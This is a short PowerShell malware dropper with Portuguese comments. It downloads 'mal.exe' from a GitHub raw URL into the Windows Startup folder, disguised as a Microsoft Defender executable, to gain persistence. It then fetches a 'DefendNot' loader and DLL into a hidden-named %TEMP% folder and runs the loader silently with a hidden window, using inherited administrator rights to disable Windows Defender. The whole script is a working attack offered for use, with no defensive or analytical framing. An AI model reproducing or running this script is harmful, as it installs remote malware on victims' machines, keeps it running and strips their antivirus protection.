# 1. Configurações Iniciais e Variáveis
$urlBase = "https://raw.githubusercontent.com/thzinxa6/Instalation/refs/heads/main/"
$tempPath = Join-Path $env:TEMP "MicrosoftDefenderCore" # Nome disfarçado
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"

# 2. Criação da pasta oculta no %TEMP%
if (!(Test-Path $tempPath)) {
    New-Item -ItemType Directory -Path $tempPath | Out-Null
}

# 3. Download do mal.exe para a Inicialização (Persistência de Usuário)
Invoke-WebRequest -Uri "$urlBase/mal.exe" -OutFile "$startupPath\MicrosoftWindowsDefender.exe" -ErrorAction SilentlyContinue

# 4. Download do DefendNot (Loader + DLL) para a pasta temporária
# Baixando os dois juntos na mesma pasta para que o loader encontre a DLL
Invoke-WebRequest -Uri "$urlBase/defendnot-loader.exe" -OutFile "$tempPath\defendnot-loader.exe" -ErrorAction SilentlyContinue
Invoke-WebRequest -Uri "$urlBase/defendnot.dll" -OutFile "$tempPath\defendnot.dll" -ErrorAction SilentlyContinue

# 5. Pequena pausa para garantir que os arquivos foram gravados no disco
Start-Sleep -Seconds 2

# 6. Execução do DefendNot-Loader
# Por ser chamado pelo PowerShell que já é ADM, ele herda o privilégio automaticamente
Start-Process -FilePath "$tempPath\defendnot-loader.exe" -ArgumentList "--silent" -WindowStyle Hidden
